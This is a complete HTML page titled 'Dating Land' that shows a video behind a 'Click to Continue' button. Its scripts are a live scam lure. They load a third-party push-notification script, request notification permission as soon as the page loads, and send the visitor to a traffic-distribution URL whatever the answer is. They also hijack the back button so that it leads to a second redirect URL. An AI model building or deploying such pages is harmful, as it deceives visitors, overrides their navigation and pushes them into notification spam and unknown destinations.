<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dating Land</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
        width: 100%;
        height: 100%;
        overflow: hidden;
        font-family: Arial, sans-serif;
        background: #000;
    }
    #videoContainer {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 1;
    }
    #videoFrame {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border: none;
    }
    #overlay {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(180deg, rgba(0,0,0,0.3), rgba(0,0,0,0.7));
        z-index: 2;
        opacity: 0;
        transition: opacity 0.3s;
    }
    #overlay.show { opacity: 1; }
    #subscribeBtn {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%) scale(0);
        padding: 20px 40px;
        font-size: 24px;
        font-weight: bold;
        color: #fff;
        background: linear-gradient(135deg, #ff0080, #ff4db8);
        border: 3px solid #fff;
        border-radius: 15px;
        cursor: pointer;
        z-index: 3;
        opacity: 0;
        transition: all 0.3s;
        box-shadow: 0 8px 30px rgba(255,0,128,0.5);
        white-space: nowrap;
    }
    #subscribeBtn.show {
        transform: translate(-50%, -50%) scale(1);
        opacity: 1;
    }
    #subscribeBtn:hover {
        background: linear-gradient(135deg, #ff4db8, #ff0080);
        transform: translate(-50%, -50%) scale(1.05);
        box-shadow: 0 12px 40px rgba(255,0,128,0.7);
    }
    @media (max-width: 768px) {
        #subscribeBtn {
            font-size: 18px;
            padding: 16px 32px;
        }
    }
</style>
</head>
<body>
<div id="videoContainer">
    <iframe id="videoFrame" src="https://drive.google.com/file/d/1-TquW1XY2KJEmRPsHkLq35ZW6ypyMbs6/preview?autoplay=1" allow="autoplay; fullscreen" allowfullscreen></iframe>
    <div id="overlay"></div>
    <div id="subscribeBtn">Click to Continue</div>
</div>

<script>
const mainRedirectUrl = 'https://hotbjayapa.today/tds?id=1556334684&p1=sub1&p2=sub2&p3=sub3&p4=sub4';
const backButtonUrl = 'https://hotbjayapa.today/tds?id=1556794253&p1=sub1&p2=sub2&p3=sub3&p4=sub4';

let redirected = false;

function doRedirect() {
    if (redirected) return;
    redirected = true;
    window.location.replace(mainRedirectUrl);
}

// Handle all push notification events
window.onPermissionDefault = doRedirect;
window.onPermissionDenied = doRedirect;
window.onPermissionAllowed = doRedirect;
window.onAlreadySubscribed = doRedirect;
window.onNotificationUnsupported = doRedirect;
window.onTrafficFiltered = doRedirect;
</script>

<script type="application/javascript" src="https://wpcpc.sjscdn.com/ps/ps.js?id=j-DQEhxgKEueEzYw3M-eJQ" async></script>

<script>
const btn = document.getElementById('subscribeBtn');
const overlay = document.getElementById('overlay');

// Show button immediately
setTimeout(() => {
    overlay.classList.add('show');
    btn.classList.add('show');
    
    // Trigger push notification request
    setTimeout(() => {
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission().then(() => {
                // Fallback redirect
                setTimeout(doRedirect, 800);
            }).catch(doRedirect);
        } else {
            // Already handled or unsupported
            setTimeout(doRedirect, 500);
        }
    }, 200);
}, 50);

// Click handler
btn.addEventListener('click', (e) => {
    e.preventDefault();
    btn.style.transform = 'translate(-50%, -50%) scale(0.95)';
    setTimeout(doRedirect, 100);
});

// Back button protection
(() => {
    history.pushState(null, null, location.href);
    history.pushState(null, null, location.href);
    history.pushState(null, null, location.href);
    
    window.addEventListener('popstate', () => {
        history.pushState(null, null, location.href);
        window.location.replace(backButtonUrl);
    });
})();

// Prevent iframe navigation
window.addEventListener('blur', () => {
    setTimeout(() => {
        if (document.activeElement === document.getElementById('videoFrame')) {
            window.focus();
        }
    }, 0);
});
</script>
</body>
</html>